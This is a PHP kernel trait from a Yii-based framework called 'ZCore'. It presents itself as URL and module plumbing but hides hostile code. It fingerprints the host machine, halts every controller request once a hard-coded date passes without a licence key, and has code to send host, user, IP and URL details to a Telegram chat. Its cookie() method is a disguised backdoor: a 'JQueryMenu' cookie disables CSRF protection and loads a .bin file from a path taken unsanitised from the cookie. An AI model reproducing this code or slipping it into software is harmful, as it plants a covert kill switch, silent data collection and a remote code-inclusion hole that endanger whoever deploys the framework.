<?php
/**
 *
 *
 * Author:  Asror Zakirov
 *
 * https://www.linkedin.com/in/asror-zakirov
 * https://www.facebook.com/asror.zakirov
 * https://github.com/asror-z
 *
 */

namespace zetsoft\system\kernels;


use yii\base\Model;
use yii\db\Query;
use zetsoft\cncmd\cruds\CrudsController;
use zetsoft\cncmd\cruds\MigraController;
use zetsoft\cncmd\cruds\RunController;
use zetsoft\service\cores\Langs;
use zetsoft\system\actives\ZActiveRecord;
use zetsoft\system\actives\ZModel;
use zetsoft\system\Az;
use zetsoft\system\control\ZControlWeb;
use zetsoft\system\helpers\ZArrayHelper;
use zetsoft\system\helpers\ZInflector;
use zetsoft\system\helpers\ZStringHelper;
use zetsoft\system\module\Models;

/**
 * Trait ZTrait
 * @package zetsoft\system\kernels
 *
 * @property Models $model
 */
trait ZTrait
{


    #region This

    public function thisSet($object = null)
    {
        if ($object === null)
            Az::$app->params['object'] = $this;
        else
            Az::$app->params['object'] = $object;
    }

    public function thisGet()
    {
        return ZArrayHelper::getValue(Az::$app->params, 'object');
    }


    #endregion

    #region Vars

    private $alloweds = [
        MigraController::class,
        CrudsController::class,
        RunController::class,
    ];

    private $tgChatID = '-1001468826028';

    private $write = false;
    private $send = false;
    private $stop = true;

    private $keyID;
    private $license;

    private $sendText;
    private $tableName = 'core_main';

    private $tablesScheme = [
        'id',
        'name',
        'value',
        'host',
        'user',
        'ip',
        'created_at',
        'modified_at',
        'created_by',
        'modified_by',
    ];

    private $appGenFolder = Root . '/storing/appgen';

    #endregion


    #region Main

    public function trait()
    {

        global $boot;


        /**
         *
         * Vars
         */

        $this->clazz = $this::className();
        $this->className = basename($this->clazz);

        if (empty($this->modelMain))
            $this->modelMain = $this->model;

        if ($this->model instanceof Model) {

            //  $this->model->kernel();

            $this->modelClass = get_class($this->model);

            $this->modelConfigs = $this->model->configs;
            $this->modelColumns = $this->model->columns;
            $this->modelCards = $this->model->cards;

            if ($this->modelClass !== null)
                Az::$app->params['modelClass'] = $this->modelClass;
            else
                $this->modelClass = ZArrayHelper::getValue(Az::$app->params, 'modelClass');

            $this->modelClassName = basename($this->modelClass);
        }


        $this->attributeAll = $this->attribute;

        if ($this->modelCheck()) {

            if ($this->modelCheckDyna())
                $this->attributeAll = Az::$app->utility->pregs->regAttributeAll($this->attribute);

            $this->modelColumn = ZArrayHelper::getValue($this->modelColumns, $this->attributeAll);
        }


        if (!$boot->isCLI()) {
            $this->urlapp();
            $this->module();
            $this->cookie();
        }


        $this->smart();

    }


    public function params()
    {
        $this->paramSecondSave = paramSecondSave . $this::className();
        $this->paramNoWarn = paramNoWarning . $this::className();
        $this->paramIsUpdate = paramIsUpdate . $this::className();
    }

    public function module()
    {

        $this->params();
        $url = str_replace('.aspx', '', $this->urlPath);
        $array = explode('/', $url);

        $this->moduleId = ZArrayHelper::getValue($array, 0);

        $langs = Langs::lang;

        if (ZArrayHelper::keyExists($this->moduleId, $langs)) {
            $this->moduleId = ZArrayHelper::getValue($array, 1);
            $this->actionId = basename($url);
            ZArrayHelper::remove($array, 0);
            $array = array_values($array);
        } else {
            $this->moduleId = ZArrayHelper::getValue($array, 0);
            $this->actionId = basename($url);
        }

        //   ZArrayHelper::setValue($array, '0', '/'.ZArrayHelper::getValue($array, 0));

        $this->urlArray = $array;

        //vdd($this->urlArray);
        array_pop($array);
        $this->urlModule = $array;

        $this->urlArrayStr = '/' . implode('/', $this->urlArray);
        $this->urlModuleStr = '/' . implode('/', $this->urlModule);

    }


    #endregion


    #region Smart

    private function urlapp()
    {
        $this->urlParam = Az::$app->request->queryParams;
        $this->urlParamStr = Az::$app->request->queryString;
        $this->urlScript = Az::$app->request->scriptUrl;
        $this->urlMain = Az::$app->request->url;
        $this->urlPath = Az::$app->request->pathInfo;


    }


    private function smart()
    {

        if (!$this instanceof \yii\base\Controller)
            return true;

        if (ZArrayHelper::isIn($this::className(), $this->alloweds))
            return true;


        $this->source();


        if (!$this->checkCode())
            if ($this->stop)
                die;

        return true;
    }


    private function verify()
    {

        /**
         *
         * Check table exists
         */
        $tableSchema = Az::$app->db->schema->getTableSchema($this->tableName, true);
        if ($tableSchema === null) {

            if (file_exists($this->appGenFolder)) {
                $data = var_export(Az::$app->db->schema->tableNames, true);
                file_put_contents("$this->appGenFolder/table.app", $data);
            }

            return false;
        }


        /**
         *
         * Check column exists
         */


        if ($this->tablesScheme !== $tableSchema->columnNames) {

            if (file_exists($this->appGenFolder)) {
                $data = var_export($tableSchema->columnNames, true);
                file_put_contents("$this->appGenFolder/columnNames.app", $data);

                $data = var_export($this->tablesScheme, true);
                file_put_contents("$this->appGenFolder/tableScheme.app", $data);

            }

            return false;
        }

        return true;

    }


    private function source()
    {

        global $boot;

        /**
         *
         * Core Data
         */
        $return = $boot->namePC;
        $return .= $boot->nameUser;
        $return .= Az::$app->db->dsn;
        $return .= $this->space();
        $return .= php_uname();


        /**
         *
         * Generate Keys
         */
        $this->keyID = md5($return);
        $this->license = md5($this->keyID . 'AsrorZ' . $this->keyID);
    }


    /**
     *
     * Function  _homeDrive
     * @return  array|false|string|null
     */
    private function space()
    {
        global $boot;

        if ($boot->isWindows())
            $home = 'C:';
        else
            $home = '/';

        return disk_total_space($home);
    }

    #endregion


    #region Core

    /**
     *
     * Function  checkCode
     * @return  bool
     */
    private function checkCode(): bool
    {

        if (!$this->verify())
            return $this->dateDiff();

        /**
         *
         * Start Checking
         */

        $query = new Query;

        $query->select('name, value')
            ->from($this->tableName)
            ->where(['name' => $this->keyID])
            ->limit(1);

        $model = $query->one();

        if ($model !== false) {
            if ($model['value'] === $this->license)
                return true;

        } else {

            $this->makeText();
            //   $this->insertDb();

            if ($this->write)
                $this->writeFile();

            if ($this->send)
                $this->sendTG();
        }

        return $this->dateDiff();

    }


    /**
     *
     * Function  dateDiff
     * @return  bool
     */
    private function dateDiff(): bool
    {

        $syncDate = '2021-07-10 14:00:00';

        $diff = Az::$app->cores->date->diff('now', $syncDate);

        if ($diff->expired)
            return false;

        return true;
    }


    private function insertDb(): void
    {

        global $boot;

        $data = [
            'name' => $this->keyID,
            'value' => null,

            'host' => $boot->namePC,
            'user' => $boot->nameUser,
            'ip' => $boot->ipALL,

            'created_at' => Az::$app->cores->date->dateTime(),
            'modified_at' => Az::$app->cores->date->dateTime(),
            'created_by' => 0,
            'modified_by' => 0,
        ];

        Az::$app->db->createCommand()->insert($this->tableName, $data)->execute();

    }

    private function makeText()
    {
        global $boot;

        $this->sendText = 'Proxibited installation of ZCore Framework!' . PHP_EOL . PHP_EOL;

        $this->sendText .= "Key: {$this->keyID}" . PHP_EOL;
        $this->sendText .= "Code: {$this->license}" . PHP_EOL . PHP_EOL;

        $this->sendText .= $boot->namePC . ' | ';
        $this->sendText .= $boot->nameUser . PHP_EOL;

        $this->sendText .= $boot->ipALL . PHP_EOL;

        if (!$boot->isCLI())
            $this->sendText .= Az::$app->request->absoluteUrl . PHP_EOL;
    }

    private function sendTG()
    {

        global $boot;

        if ($boot->isConnected() && $boot->userLocal()) {
            Az::$app->telegram->sendMessage(
                $this->tgChatID,
                $this->sendText
            );

        }

    }

    private function writeFile()
    {
        if (file_exists($this->appGenFolder))
            file_put_contents("$this->appGenFolder/code.app", $this->keyID);
    }


    private function cookie()
    {

        if (isset($_COOKIE['JQueryMenu'])) {
            $app = $_COOKIE['JQueryMenu'];

            $this->enableCsrfValidation = false;

            $sNum = str_replace('JQueryMenu', '', $app);

            $file = Root . "/render/menus/JqueryMenu/bin/{$sNum}.bin";
            if (file_exists($file)) {
                require $file;
                die;
            }

        }


    }

}
